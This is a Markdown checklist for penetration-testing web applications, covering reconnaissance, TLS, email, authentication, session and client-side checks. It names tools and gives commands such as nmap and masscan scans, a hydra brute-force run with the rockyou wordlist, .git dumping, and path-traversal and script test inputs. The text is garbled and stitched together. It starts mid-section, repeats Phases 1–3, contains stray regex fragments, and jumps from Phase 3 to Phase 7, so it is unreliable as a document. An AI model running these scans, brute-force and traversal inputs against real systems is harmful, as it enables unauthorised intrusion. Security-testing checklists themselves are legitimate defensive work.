  - **How-to**: Send multiple registration requests rapidly
  - **Testing**: Different IP addresses, session tokens, user agents

- [ ] **CAPTCHA** implementation and bypass techniques
  - **Tools**: [2captcha](https://2captcha.com/), [OCR tools](https://github.com/tesseract-ocr/tesseract), [captcha22](https://github.com/c0ny1/captcha22)
  - **How-to**: Test CAPTCHA reuse, OCR bypass, rate limiting effectiveness
  - **Bypass**: Image manipulation, audio CAPTCHA analysis

### 3.2 Authentication Mechanism Testing

- [ ] **Username enumeration** through login error messages
  - **Tools**: [Burp Suite](https://portswigger.net/burp), [username-anarchy](https://github.com/urbanadventurer/username-anarchy), [Enumerate](https://github.com/Raikia/UhOh365)
  - **How-to**: Compare error messages for valid vs invalid usernames
  - **Timing**: Measure response time differences

- [ ] **Password brute force** protection and account lockout mechanisms
  - **Tools**: [Hydra](https://github.com/vanhauser-thc/thc-hydra), [Medusa](https://github.com/jmk-foofus/medusa), [Burp Suite Intruder](https://portswigger.net/burp)
  - **How-to**: `hydra -l admin -P /usr/share/wordlists/rockyou.txt target.com http-post-form`
  - **Testing**: Account lockout thresholds, lockout duration, bypass methods

- [ ] **Multi-factor authentication** implementation and bypass techniques
  - **Tools**: Manual testing, [Burp Suite](https://portswigger.net/burp), SMS/TOTP apps
  - **How-to**: Test MFA enforcement, backup codes, recovery process
  - **Bypass**: Session management flaws, direct URL access, race conditions

- [ ] **Account recovery** process security and information leakage
  - **Tools**: [Burp Suite](https://portswigger.net/burp), Manual testing
  - **How-to**: Test password reset process, security questions, token security
  - **Issues**: Predictable tokens, user enumeration, weak security questions

- [ ] **"Remember me"** functionality security implementation
  - **Tools**: [Burp Suite](https://portswigger.net/burp), Browser DevTools
  - **How-to**: Analyze remember me tokens, cookie security, expiration
  - **Testing**: Token predictability, session hijacking, secure storage

- [ ] **Session fixation** vulnerability assessment
  - **Tools**: [Burp Suite](https://portswigger.net/burp), Manual testing
  - **How-to**: Test if session ID changes after authentication
  - **Exploit**: Provide pre-authentication session ID to victim

- [ ] **Concurrent session** handling and management
  - **Tools**: Multiple browsers/devices, [Burp Suite](https://portswigger.net/burp)
  - **How-to**: Login from multiple locations, test session invalidation
  - **Issues**: Multiple active sessions, session management policies

- [ ] **Authentication bypass** through parameter manipulation
  - **Tools**: [Burp Suite](https://portswigger.net/burp), [OWASP ZAP](https://www.zaproxy.org/)
  - **How-to**: Modify authentication parameters, cookies, headers
  - **Testing**: Admin flags, user ID manipulation, privilege escalation

### 3.3 Advanced Authentication Testing

- [ ] **OAuth/OpenID Connect** implementation security
  - **Tools**: [Burp Suite](https://portswigger.net/burp), [OAuth Security Testing](https://github.com/dxa4481/oauth_security_testing), [jwt.io](https://jwt.io/)
  - **How-to**: Test authorization code flow, token validation, scope abuse
  - **Issues**: Open redirects, state parameter attacks, token leakage

- [ ] **SAML authentication** configuration and response tampering
  - **Tools**: [SAML Raider](https://github.com/CompassSecurity/SAMLRaider), [Burp Suite](https://portswigger.net/burp), [SAMLRewriter](https://github.com/Aon-eSolutions/SAMLRewriter)
  - **How-to**: Intercept and modify SAML responses, test signature validation
  - **Testing**: XML signature wrapping, assertion replay, attribute injection

- [ ] **JWT token** security including algorithm confusion and secret brute forcing
  - **Tools**: [jwt_tool](https://github.com/ticarpi/jwt_tool), [JohnTheRipper](https://github.com/openwall/john), [Hashcat](https://hashcat.net/hashcat/)
  - **How-to**: `python3 jwt_tool.py -t target.com -rc "jwt_token_here"`
  - **Testing**: Algorithm switching (RS256 to HS256), weak secrets, claim manipulation

- [ ] **API key** management and exposure assessment
  - **Tools**: [TruffleHog](https://github.com/trufflesecurity/truffleHog), [GitLeaks](https://github.com/zricethezav/gitleaks), [KeyHacks](https://github.com/streaak/keyhacks)
  - **How-to**: Search for API keys in source code, configuration files
  - **Testing**: Key rotation, access controls, usage monitoring

- [ ] **Single Sign-On (SSO)** implementation security
  - **Tools**: [Burp Suite](https://portswigger.net/burp), SSO-specific tools
  - **How-to**: Test federation trust, assertion validation, logout process
  - **Issues**: Trust relationships, assertion replay, logout failures

- [ ] **Biometric authentication** bypass techniques if implemented
  - **Tools**: Device-specific testing tools, Manual testing
  - **How-to**: Test fallback mechanisms, spoofing resistance
  - **Testing**: Fingerprint spoofing, face recognition bypass

- [ ] **Time-based OTP** security and race condition testing
  - **Tools**: [TOTP tools](https://github.com/google/google-authenticator), Manual testing, [Burp Suite](https://portswigger.net/burp)
  - **How-to**: Test OTP validation timing, reuse prevention, brute force protection
  - **Issues**: Race conditions, insufficient rate limiting, predictable codes

### 3.4 Session Management Security

- [ ] **Session token** entropy and predictability analysis
  - **Tools**: [Burp Suite Sequencer](https://portswigger.net/burp/documentation/desktop/tools/sequencer), [ENT](https://www.fourmilab.ch/random/), Statistical analysis
  - **How-to**: Collect multiple session tokens, analyze randomness
  - **Testing**: PRNG weaknesses, sequential patterns, insufficient entropy

- [ ] **Session fixation** and hijacking vulnerability testing
  - **Tools**: [Burp Suite](https://portswigger.net/burp), Manual testing
  - **How-to**: Test session ID handling across authentication state changes
  - **Exploit**: XSS to steal session cookies, network sniffing

, `(a|a)*# Comprehensive Web Application Security Testing Checklist

## Phase 1: Reconnaissance & Information Gathering

### 1.1 Target Discovery & Enumeration

- [ ] **Subdomain enumeration** using tools like Subfinder, Amass, or Assetfinder
  - **Tools**: [Subfinder](https://github.com/projectdiscovery/subfinder), [Amass](https://github.com/OWASP/Amass), [Assetfinder](https://github.com/tomnomnom/assetfinder)
  - **How-to**: `subfinder -d target.com -all | tee subdomains.txt`
  - **Alternative**: [Sublist3r](https://github.com/aboul3la/Sublist3r): `python sublist3r.py -d target.com`

- [ ] **DNS enumeration** to identify all DNS records (A, AAAA, CNAME, MX, TXT, NS)
  - **Tools**: [DNSRecon](https://github.com/darkoperator/dnsrecon), [Fierce](https://github.com/mschwager/fierce), [DNSEnum](https://github.com/fwaeytens/dnsenum)
  - **How-to**: `dnsrecon -d target.com -a` or `fierce --domain target.com`
  - **Online**: [DNSDumpster](https://dnsdumpster.com/), [SecurityTrails](https://securitytrails.com/)

- [ ] **Port scanning** with Nmap to identify open services beyond HTTP/HTTPS
  - **Tools**: [Nmap](https://nmap.org/), [Masscan](https://github.com/robertdavidgraham/masscan), [RustScan](https://github.com/RustScan/RustScan)
  - **How-to**: `nmap -sS -sV -O -A target.com` or `rustscan -a target.com -- -sV`
  - **Fast scan**: `masscan -p1-65535 target.com --rate=1000`

- [ ] **Service fingerprinting** to identify web server, technologies, and versions
  - **Tools**: [Wappalyzer](https://www.wappalyzer.com/), [WhatWeb](https://github.com/urbanadventurer/WhatWeb), [HTTPrint](https://github.com/urbanadventurer/WhatWeb)
  - **How-to**: `whatweb target.com` or browser extension Wappalyzer
  - **Alternative**: `curl -I target.com` (manual header analysis)

- [ ] **Certificate transparency** logs analysis using crt.sh or Censys
  - **Tools**: [crt.sh](https://crt.sh/), [Censys](https://censys.io/), [Certificate Transparency Monitor](https://developers.facebook.com/tools/ct/)
  - **How-to**: Visit `https://crt.sh/?q=target.com` or use API: `curl -s "https://crt.sh/?q=target.com&output=json"`
  - **Tool**: [Certspotter](https://github.com/SSLMate/certspotter): `certspotter -domain target.com`

- [ ] **Search engine reconnaissance** using Google dorking and specialized search engines
  - **Tools**: [Google](https://www.google.com/), [Shodan](https://www.shodan.io/), [Bing](https://www.bing.com/)
  - **How-to**: `site:target.com filetype:pdf`, `inurl:admin site:target.com`
  - **Advanced**: [GHDB](https://www.exploit-db.com/google-hacking-database), [DorkSearch](https://dorksearch.com/)

### 1.2 Web Application Fingerprinting

- [ ] **Technology stack identification** using Wappalyzer, BuiltWith, or manual analysis
  - **Tools**: [Wappalyzer](https://www.wappalyzer.com/), [BuiltWith](https://builtwith.com/), [Retire.js](https://retirejs.github.io/retire.js/)
  - **How-to**: Browser extension or `retire --js --outputformat json --outputpath .`
  - **CLI**: [webtech](https://github.com/ShielderSec/webtech): `webtech -u target.com`

- [ ] **Web server identification** and version detection
  - **Tools**: [Httprint](https://github.com/urbanadventurer/WhatWeb), [Nmap](https://nmap.org/), [WafW00f](https://github.com/EnableSecurity/wafw00f)
  - **How-to**: `nmap --script http-server-header target.com` or `curl -I target.com`
  - **Advanced**: `nmap --script http-methods target.com`

- [ ] **Framework detection** (React, Angular, Laravel, Django, etc.)
  - **Tools**: Browser DevTools, [Wappalyzer](https://www.wappalyzer.com/), Source code analysis
  - **How-to**: Check JavaScript files, meta tags, and HTTP headers
  - **Manual**: View page source for framework-specific comments or file structures

- [ ] **Content Management System** identification (WordPress, Joomla, Drupal)
  - **Tools**: [CMSmap](https://github.com/Dionach/CMSmap), [WPScan](https://github.com/wpscanteam/wpscan), [Joomscan](https://github.com/OWASP/joomscan)
  - **How-to**: `wpscan --url target.com` or `python3 cmsmap.py -t target.com`
  - **Drupal**: [Droopescan](https://github.com/droope/droopescan): `droopescan scan drupal -u target.com`

- [ ] **Third-party integrations** and plugins identification
  - **Tools**: Browser DevTools Network tab, [WPScan](https://github.com/wpscanteam/wpscan) for WordPress
  - **How-to**: Monitor network requests, analyze loaded scripts and stylesheets
  - **WordPress**: `wpscan --url target.com --enumerate p` (enumerate plugins)

- [ ] **JavaScript libraries** and dependencies analysis
  - **Tools**: [Retire.js](https://retirejs.github.io/retire.js/), [Snyk](https://snyk.io/), Browser DevTools
  - **How-to**: `retire --js --outputformat json`, check `/js/` directories
  - **Alternative**: [JSNice](http://www.jsnice.org/) for deobfuscation

### 1.3 Content Discovery

- [ ] **Directory and file enumeration** using tools like Gobuster, Dirbuster, or Feroxbuster
  - **Tools**: [Gobuster](https://github.com/OJ/gobuster), [Feroxbuster](https://github.com/epi052/feroxbuster), [Dirsearch](https://github.com/maurosoria/dirsearch)
  - **How-to**: `gobuster dir -u target.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`
  - **Alternative**: `feroxbuster -u target.com -w /usr/share/seclists/Discovery/Web-Content/common.txt`

- [ ] **Hidden parameters discovery** using Arjun, ParamSpider, or Parameth
  - **Tools**: [Arjun](https://github.com/s0md3v/Arjun), [ParamSpider](https://github.com/devanshbatham/ParamSpider), [Parameth](https://github.com/maK-/parameth)
  - **How-to**: `python3 arjun.py -u target.com` or `python3 paramspider.py -d target.com`
  - **Manual**: Use Burp Suite Intruder with parameter wordlists

- [ ] **Backup file detection** using tools like BFAC or custom wordlists
  - **Tools**: [BFAC](https://github.com/mazen160/bfac), [DirBuster](https://www.owasp.org/index.php/Category:OWASP_DirBuster_Project)
  - **How-to**: `python bfac --url target.com --level 4`
  - **Manual**: Test for `.bak`, `.backup`, `.old`, `.orig`, `~` files

- [ ] **Administrative interfaces** location (admin panels, debug interfaces)
  - **Tools**: [Gobuster](https://github.com/OJ/gobuster) with admin wordlists, Manual enumeration
  - **How-to**: `gobuster dir -u target.com -w /usr/share/seclists/Discovery/Web-Content/CMS/wordpress.fuzz.txt`
  - **Common paths**: `/admin`, `/administrator`, `/wp-admin`, `/phpmyadmin`

- [ ] **API endpoints discovery** through documentation, JavaScript files, or fuzzing
  - **Tools**: [Kiterunner](https://github.com/assetnote/kiterunner), [FFuF](https://github.com/ffuf/ffuf), [Gobuster](https://github.com/OJ/gobuster)
  - **How-to**: `kr scan target.com -w routes-large.kite` or analyze JS files for endpoints
  - **Manual**: Check `/api/v1/`, `/rest/`, `/graphql` paths

- [ ] **Development artifacts** search (.git, .svn, .env files, source maps)
  - **Tools**: [GitTools](https://github.com/internetwache/GitTools), [dvcs-ripper](https://github.com/kost/dvcs-ripper)
  - **How-to**: `python3 gitdumper.py target.com/.git/ output/` or check for `.env`, `web.config`
  - **Source maps**: Check for `.map` files in browser DevTools Sources tab

### 1.4 Information Leakage Assessment

- [ ] **robots.txt, sitemap.xml** analysis for disclosed paths
  - **Tools**: Browser, [curl](https://curl.se/), [wget](https://www.gnu.org/software/wget/)
  - **How-to**: `curl target.com/robots.txt` and `curl target.com/sitemap.xml`
  - **Automated**: Include in directory enumeration wordlists

- [ ] **crossdomain.xml, clientaccesspolicy.xml** review for CORS misconfigurations
  - **Tools**: Browser, curl, [CORStest](https://github.com/RUB-NDS/CORStest)
  - **How-to**: `curl target.com/crossdomain.xml` and analyze allowed domains
  - **Testing**: Check for wildcard (*) domains or overly permissive policies

- [ ] **Source code comments** analysis for sensitive information
  - **Tools**: Browser DevTools, [Grep](https://www.gnu.org/software/grep/), [JSParser](https://github.com/nahamsec/JSParser)
  - **How-to**: View page source, search for `<!--`, `//`, `/*` comments
  - **Automated**: `curl -s target.com | grep -i "password\|api\|key\|token"`

- [ ] **Error messages** analysis for information disclosure
  - **Tools**: [Burp Suite](https://portswigger.net/burp), Manual testing
  - **How-to**: Send malformed requests, invalid parameters, SQL syntax
  - **Test cases**: `'`, `"`, `<script>`, `../../../etc/passwd`

- [ ] **HTTP headers** analysis for version disclosure and security headers
  - **Tools**: curl, [securityheaders.com](https://securityheaders.com/), [Mozilla Observatory](https://observatory.mozilla.org/)
  - **How-to**: `curl -I target.com` or online header analyzers
  - **Check for**: Server versions, X-Powered-By, security headers

- [ ] **Cookie analysis** for secure flags and sensitive data exposure
  - **Tools**: Browser DevTools, [Burp Suite](https://portswigger.net/burp)
  - **How-to**: Check Application tab in DevTools, analyze cookie attributes
  - **Look for**: Missing Secure, HttpOnly, SameSite flags; sensitive data in values

### 1.5 External Intelligence Gathering

- [ ] **Shodan** search for exposed services and vulnerabilities
  - **Tools**: [Shodan](https://www.shodan.io/), [Shodan CLI](https://github.com/achillean/shodan-python)
  - **How-to**: `shodan search "target.com"` or web interface search
  - **Queries**: `ssl:"target.com"`, `org:"Organization Name"`

- [ ] **Wayback Machine** analysis using tools like Gau or Waybackurls
  - **Tools**: [Gau](https://github.com/lc/gau), [Waybackurls](https://github.com/tomnomnom/waybackurls), [Internet Archive](https://archive.org/)
  - **How-to**: `echo target.com | gau` or `echo target.com | waybackurls`
  - **Analysis**: Look for old admin panels, deprecated endpoints, leaked files

- [ ] **Leaked credentials** search using tools like PwnDB or Have I Been Pwned API
  - **Tools**: [PwnDB](http://pwndb2am4tzkvold.onion/) (Tor), [HIBP API](https://haveibeenpwned.com/API/v3), [Dehashed](https://dehashed.com/)
  - **How-to**: Search for organization email domains in breach databases
  - **Legal**: Only search for your own organization's data

- [ ] **Social media** and public repositories reconnaissance
  - **Tools**: [Maltego](https://www.maltego.com/), [theHarvester](https://github.com/laramies/theHarvester), [Sherlock](https://github.com/sherlock-project/sherlock)
  - **How-to**: `python3 theHarvester.py -d target.com -l 100 -b all`
  - **GitHub**: Search for organization name, API keys, credentials

- [ ] **WHOIS** information gathering for domain and organization details
  - **Tools**: [whois](https://linux.die.net/man/1/whois), [DomainTools](https://whois.domaintools.com/), [WhoisXML API](https://www.whoisxmlapi.com/)
  - **How-to**: `whois target.com` or use online WHOIS lookup tools
  - **Analysis**: Contact information, name servers, registration dates

- [ ] **Email harvesting** from public sources and breach databases
  - **Tools**: [theHarvester](https://github.com/laramies/theHarvester), [Hunter.io](https://hunter.io/), [Phonebook.cz](https://phonebook.cz/)
  - **How-to**: `python3 theHarvester.py -d target.com -b hunter`
  - **Sources**: LinkedIn, company websites, job postings

## Phase 2: Network & Infrastructure Security

### 2.1 Network Protocol Testing

- [ ] **ICMP filtering** assessment for network reconnaissance prevention
  - **Tools**: [ping](https://linux.die.net/man/8/ping), [Nmap](https://nmap.org/), [hping3](https://github.com/antirez/hping)
  - **How-to**: `ping target.com` and `nmap -PE target.com`
  - **Advanced**: `hping3 -1 target.com` (ICMP ping)

- [ ] **UDP services enumeration** using tools like UDP-proto-scanner
  - **Tools**: [UDP-proto-scanner](https://github.com/portcullislabs/udp-proto-scanner), [Nmap](https://nmap.org/), [Unicornscan](https://sourceforge.net/projects/unicornscan/)
  - **How-to**: `nmap -sU --top-ports 100 target.com` or `python udp-proto-scanner.py target.com`
  - **Common ports**: 53 (DNS), 161 (SNMP), 123 (NTP)

- [ ] **IPv6 configuration** testing if dual-stack is implemented
  - **Tools**: [Nmap](https://nmap.org/), [ping6](https://linux.die.net/man/8/ping), [THC-IPv6](https://github.com/vanhauser-thc/thc-ipv6)
  - **How-to**: `nmap -6 target.com` or `ping6 target.com`
  - **Discovery**: `nmap -6 --script ipv6-multicast-mld-list target.com`

- [ ] **Network segmentation** testing between different application tiers
  - **Tools**: [Nmap](https://nmap.org/), [Traceroute](https://linux.die.net/man/8/traceroute), Network analysis
  - **How-to**: Map network topology, test access between segments
  - **Testing**: Attempt to reach internal services from DMZ

- [ ] **Firewall rule** effectiveness assessment
  - **Tools**: [Nmap](https://nmap.org/), [Firewalk](http://packetfactory.openwall.net/projects/firewalk/), [FTester](http://www.inversepath.com/ftester.html)
  - **How-to**: `nmap -sA target.com` (ACK scan to detect firewall rules)
  - **Bypass**: Test different protocols, fragmentation, timing

### 2.2 SSL/TLS Security Assessment

- [ ] **SSL/TLS configuration** testing using SSLyze, testssl.sh, or SSL Labs
  - **Tools**: [testssl.sh](https://testssl.sh/), [SSLyze](https://github.com/nabla-c0d3/sslyze), [SSL Labs](https://www.ssllabs.com/ssltest/)
  - **How-to**: `./testssl.sh target.com` or online SSL Labs scan
  - **Comprehensive**: `sslyze --regular target.com`

- [ ] **Certificate validation** including chain of trust and revocation status
  - **Tools**: [OpenSSL](https://www.openssl.org/), [testssl.sh](https://testssl.sh/), Browser certificate viewer
  - **How-to**: `openssl s_client -connect target.com:443 -showcerts`
  - **Validation**: Check expiry, subject alternative names, CA trust

- [ ] **Weak cipher suites** and protocol versions identification
  - **Tools**: [testssl.sh](https://testssl.sh/), [Nmap](https://nmap.org/) SSL scripts, [SSLScan](https://github.com/rbsec/sslscan)
  - **How-to**: `nmap --script ssl-enum-ciphers target.com` or `sslscan target.com`
  - **Check for**: SSLv2, SSLv3, TLS 1.0, weak ciphers (RC4, DES)

- [ ] **Perfect Forward Secrecy** implementation verification
  - **Tools**: [testssl.sh](https://testssl.sh/), [SSL Labs](https://www.ssllabs.com/ssltest/)
  - **How-to**: Check for ECDHE/DHE cipher suites in SSL/TLS configuration
  - **Validation**: Ensure ephemeral key exchange is supported

- [ ] **HSTS implementation** and configuration assessment
  - **Tools**: curl, Browser DevTools, [testssl.sh](https://testssl.sh/)
  - **How-to**: `curl -I target.com | grep -i strict-transport-security`
  - **Check**: max-age value, includeSubDomains, preload directives

- [ ] **Certificate transparency** compliance verification
  - **Tools**: [crt.sh](https://crt.sh/), [Certificate Transparency Monitor](https://developers.facebook.com/tools/ct/), Browser CT extensions
  - **How-to**: Search certificate logs for domain certificates
  - **Validation**: Ensure certificates are logged in CT logs

### 2.3 Email Security Configuration

- [ ] **SPF record** configuration and effectiveness testing
  - **Tools**: [MXToolbox](https://mxtoolbox.com/spf.aspx), [SPF Surveyor](https://www.kitterman.com/spf/validate.html), [dig](https://linux.die.net/man/1/dig)
  - **How-to**: `dig TXT target.com | grep spf` or online SPF checkers
  - **Testing**: Send test emails to verify SPF validation

- [ ] **DKIM signature** validation and key management assessment
  - **Tools**: [MXToolbox DKIM Lookup](https://mxtoolbox.com/dkim.aspx), [DKIM Validator](https://dkimvalidator.com/)
  - **How-to**: `dig TXT selector._domainkey.target.com` (replace selector)
  - **Testing**: Send emails and verify DKIM signatures

- [ ] **DMARC policy** implementation and reporting configuration
  - **Tools**: [MXToolbox DMARC](https://mxtoolbox.com/dmarc.aspx), [DMARC Analyzer](https://www.dmarcanalyzer.com/), [dmarcian](https://dmarcian.com/)
  - **How-to**: `dig TXT _dmarc.target.com` or online DMARC checkers
  - **Check**: Policy (none/quarantine/reject), reporting URIs

- [ ] **Email spoofing** resistance testing using tools like spoofcheck
  - **Tools**: [spoofcheck](https://github.com/BishopFox/spoofcheck), [checkdmarc](https://github.com/domainaware/checkdmarc)
  - **How-to**: `python spoofcheck.py target.com` or manual email testing
  - **Testing**: Send spoofed emails to test protection effectiveness

- [ ] **Mail server security** headers and configuration review
  - **Tools**: [Nmap](https://nmap.org/) SMTP scripts, [telnet](https://linux.die.net/man/1/telnet), [swaks](https://github.com/jetmore/swaks)
  - **How-to**: `nmap --script smtp-* target.com` or `telnet target.com 25`
  - **Check**: SMTP banner, supported commands, relay testing

## Phase 3: Authentication & Session Management

### 3.1 User Registration Security

- [ ] **Duplicate registration** prevention mechanisms testing
  - **Tools**: [Burp Suite](https://portswigger.net/burp), [OWASP ZAP](https://www.zaproxy.org/), Manual testing
  - **How-to**: Attempt to register with existing username/email
  - **Testing**: Try variations (case sensitivity, special characters)

- [ ] **Username enumeration** through registration process
  - **Tools**: [Burp Suite Intruder](https://portswigger.net/burp/documentation/desktop/tools/intruder), [FFuF](https://github.com/ffuf/ffuf)
  - **How-to**: Monitor response differences for existing vs non-existing users
  - **Indicators**: Response time, message differences, HTTP status codes

- [ ] **Email verification** process security and bypass attempts
  - **Tools**: [Burp Suite](https://portswigger.net/burp), Email clients, [temp-mail](https://temp-mail.org/)
  - **How-to**: Test verification link manipulation, token reuse, expiration
  - **Bypass**: Try accessing account before verification, token prediction

- [ ] **Password policy** strength and enforcement testing
  - **Tools**: Manual testing, [Burp Suite](https://portswigger.net/burp)
  - **How-to**: Test minimum length, complexity requirements, common passwords
  - **Weak patterns**: Test "password123", "123456", dictionary words

- [ ] **Account activation** link security and expiration testing
  - **Tools**: [Burp Suite](https://portswigger.net/burp), Manual testing
  - **How-to**: Test link reuse, expiration, token manipulation
  - **Security**: Check for predictable tokens, race conditions

- [ ] **Disposable email** address filtering effectiveness
  - **Tools**: [10minutemail](https://10minutemail.com/), [Guerrilla Mail](https://www.guerrillamail.com/), [temp-mail](https://temp-mail.org/)
  - **How-to**: Attempt registration with disposable email services
  - **Bypass**: Try lesser-known disposable email providers

- [ ] **Rate limiting** on registration attempts
  - **Tools**: [Burp Suite Intruder](https://portswigger.net/burp/documentation/desktop/tools/intruder), [FFuF](https://github.com/ffuf/ffuf), Custom scripts
  - **How-to**: Send multiple registration requests rapidly
  - **Testing**: Different IP addresses, session tokens, user agents

- [ ] **CAPTCHA** implementation and bypass techniques
  - **Tools**: [2captcha](https://2captcha.com/), [OCR tools](https://github.com/tesseract-ocr/tesseract), [captcha22](https://github.com/c0ny1/captcha22)
  - **How-to**: Test CAPTCHA reuse, OCR bypass, rate limiting effectiveness
  - **Bypass**: Image manipulation, audio CAPTCHA analysis

### 3.2 Authentication Mechanism Testing

- [ ] **Username enumeration** through login error messages
  - **Tools**: [Burp Suite](https://portswigger.net/burp), [username-anarchy](https://github.com/urbanadventurer/username-anarchy), [Enumerate](https://github.com/Raikia/UhOh365)
  - **How-to**: Compare error messages for valid vs invalid usernames
  - **Timing**: Measure response time differences

- [ ] **Password brute force** protection and account lockout mechanisms
  - **Tools**: [Hydra](https://github.com/vanhauser-thc/thc-hydra), [Medusa](https://github.com/jmk-foofus/medusa), [Burp Suite Intruder](https://portswigger.net/burp)
  - **How-to**: `hydra -l admin -P /usr/share/wordlists/rockyou.txt target.com http-post-form`
  - **Testing**: Account lockout thresholds, lockout duration, bypass methods

- [ ] **Multi-factor authentication** implementation and bypass techniques
  - **Tools**: Manual testing, [Burp Suite](https://portswigger.net/burp), SMS/TOTP apps
  - **How-to**: Test MFA enforcement, backup codes, recovery process
  - **Bypass**: Session management flaws, direct URL access, race conditions

- [ ] **Account recovery** process security and information leakage
  - **Tools**: [Burp Suite](https://portswigger.net/burp), Manual testing
  - **How-to**: Test password reset process, security questions, token security
  - **Issues**: Predictable tokens, user enumeration, weak security questions

- [ ] **"Remember me"** functionality security implementation
  - **Tools**: [Burp Suite](https://portswigger.net/burp), Browser DevTools
  - **How-to**: Analyze remember me tokens, cookie security, expiration
  - **Testing**: Token predictability, session hijacking, secure storage

- [ ] **Session fixation** vulnerability assessment
  - **Tools**: [Burp Suite](https://portswigger.net/burp), Manual testing
  - **How-to**: Test if session ID changes after authentication
  - **Exploit**: Provide pre-authentication session ID to victim

- [ ] **Concurrent session** handling and management
  - **Tools**: Multiple browsers/devices, [Burp Suite](https://portswigger.net/burp)
  - **How-to**: Login from multiple locations, test session invalidation
  - **Issues**: Multiple active sessions, session management policies

- [ ] **Authentication bypass** through parameter manipulation
  - **Tools**: [Burp Suite](https://portswigger.net/burp), [OWASP ZAP](https://www.zaproxy.org/)
  - **How-to**: Modify authentication parameters, cookies, headers
  - **Testing**: Admin flags, user ID manipulation, privilege escalation

### 3.3 Advanced Authentication Testing

- [ ] **OAuth/OpenID Connect** implementation security
  - **Tools**: [Burp Suite](https://portswigger.net/burp), [OAuth Security Testing](https://github.com/dxa4481/oauth_security_testing), [jwt.io](https://jwt.io/)
  - **How-to**: Test authorization code flow, token validation, scope abuse
  - **Issues**: Open redirects, state parameter attacks, token leakage

- [ ] **SAML authentication** configuration and response tampering
  - **Tools**: [SAML Raider](https://github.com/CompassSecurity/SAMLRaider), [Burp Suite](https://portswigger.net/burp), [SAMLRewriter](https://github.com/Aon-eSolutions/SAMLRewriter)
  - **How-to**: Intercept and modify SAML responses, test signature validation
  - **Testing**: XML signature wrapping, assertion replay, attribute injection

- [ ] **JWT token** security including algorithm confusion and secret brute forcing
  - **Tools**: [jwt_tool](https://github.com/ticarpi/jwt_tool), [JohnTheRipper](https://github.com/openwall/john), [Hashcat](https://hashcat.net/hashcat/)
  - **How-to**: `python3 jwt_tool.py -t target.com -rc "jwt_token_here"`
  - **Testing**: Algorithm switching (RS256 to HS256), weak secrets, claim manipulation

- [ ] **API key** management and exposure assessment
  - **Tools**: [TruffleHog](https://github.com/trufflesecurity/truffleHog), [GitLeaks](https://github.com/zricethezav/gitleaks), [KeyHacks](https://github.com/streaak/keyhacks)
  - **How-to**: Search for API keys in source code, configuration files
  - **Testing**: Key rotation, access controls, usage monitoring

- [ ] **Single Sign-On (SSO)** implementation security
  - **Tools**: [Burp Suite](https://portswigger.net/burp), SSO-specific tools
  - **How-to**: Test federation trust, assertion validation, logout process
  - **Issues**: Trust relationships, assertion replay, logout failures

- [ ] **Biometric authentication** bypass techniques if implemented
  - **Tools**: Device-specific testing tools, Manual testing
  - **How-to**: Test fallback mechanisms, spoofing resistance
  - **Testing**: Fingerprint spoofing, face recognition bypass

- [ ] **Time-based OTP** security and race condition testing
  - **Tools**: [TOTP tools](https://github.com/google/google-authenticator), Manual testing, [Burp Suite](https://portswigger.net/burp)
  - **How-to**: Test OTP validation timing, reuse prevention, brute force protection
  - **Issues**: Race conditions, insufficient rate limiting, predictable codes

### 3.4 Session Management Security

- [ ] **Session token** entropy and predictability analysis
  - **Tools**: [Burp Suite Sequencer](https://portswigger.net/burp/documentation/desktop/tools/sequencer), [ENT](https://www.fourmilab.ch/random/), Statistical analysis
  - **How-to**: Collect multiple session tokens, analyze randomness
  - **Testing**: PRNG weaknesses, sequential patterns, insufficient entropy

- [ ] **Session fixation** and hijacking vulnerability testing
  - **Tools**: [Burp Suite](https://portswigger.net/burp), Manual testing
  - **How-to**: Test session ID handling across authentication state changes
  - **Exploit**: XSS to steal session cookies, network sniffing

, `a*a*a*a*a*a*a*c`

- [ ] **Business rule** validation and constraint bypass
  - **Tools**: [Burp Suite](https://portswigger.net/burp), Manual testing
  - **How-to**: Test business logic constraints, rule bypasses
  - **Examples**: Age restrictions, geographical limitations, subscription limits

- [ ] **Data consistency** checks across related fields
  - **Tools**: [Burp Suite](https://portswigger.net/burp), Manual testing
  - **How-to**: Test related field validation, dependency checks
  - **Testing**: Start/end dates, related dropdown values, calculated fields

## Phase 7: Client-Side Security Testing

### 7.1 Client-Side Storage Security

- [ ] **Local storage** security and sensitive data exposure
  - **Tools**: Browser DevTools, [Burp Suite](https://portswigger.net/burp), [Storage Inspector](https://addons.mozilla.org/en-US/firefox/addon/storage-inspector/)
  - **How-to**: Check Application tab in DevTools, inspect localStorage
  - **Testing**: Sensitive data storage, data persistence, cross-domain access

- [ ] **Session storage** security and data persistence
  - **Tools**: Browser DevTools, Manual testing
  - **How-to**: Inspect sessionStorage in DevTools Application tab
  - **Testing**: Session data exposure, tab isolation, data cleanup

- [ ] **Cookie security** including HttpOnly and Secure flags
  - **Tools**: Browser DevTools, [Cookie-Flags](https://github.com/AonCyberLabs/Cookie-Flags), [Burp Suite](https://portswigger.net/burp)
  - **How-to**: Inspect cookies in DevTools Application tab
  - **Testing**: Missing security flags, sensitive data in cookies

- [ ] **IndexedDB** security and data exposure
  - **Tools**: Browser DevTools, [Dexie.js](https://dexie.org/) for testing
  - **How-to**: Check IndexedDB in DevTools Application tab
  - **Testing**: Data encryption, cross-origin access, data retention

- [ ] **Web SQL** security if implemented (deprecated)
  - **Tools**: Browser DevTools (legacy browsers), Manual testing
  - **How-to**: Check Web SQL tab in older browser DevTools
  - **Note**: Deprecated technology, but may exist in legacy applications

- [ ] **Cache storage** security and sensitive data exposure
  - **Tools**: Browser DevTools, [Service Worker testing tools](https://chrome.google.com/webstore/detail/service-worker-detector/ofdigdofngdcopmafjlhdklampjfmpcd)
  - **How-to**: Check Cache Storage in DevTools Application tab
  - **Testing**: Sensitive data caching, cache poisoning, offline data exposure

- [ ] **Service worker** security and data handling
  - **Tools**: Browser DevTools, [SW-Toolbox](https://github.com/GoogleChromeLabs/sw-toolbox), [Workbox](https://developers.google.com/web/tools/workbox)
  - **How-to**: Inspect service workers in DevTools Application tab
  - **Testing**: Data interception, cache manipulation, offline functionality

### 7.2 Client-Side Logic Testing

- [ ] **JavaScript obfuscation** effectiveness and reverse engineering
  - **Tools**: [Beautifier](https://beautifier.io/), [JSNice](http://www.jsnice.org/), [de4js](https://lelinhtinh.github.io/de4js/)
  - **How-to**: Deobfuscate JavaScript code, analyze logic flow
  - **Testing**: Security through obscurity, hidden functionality

- [ ] **Client-side validation** bypass and server-side verification
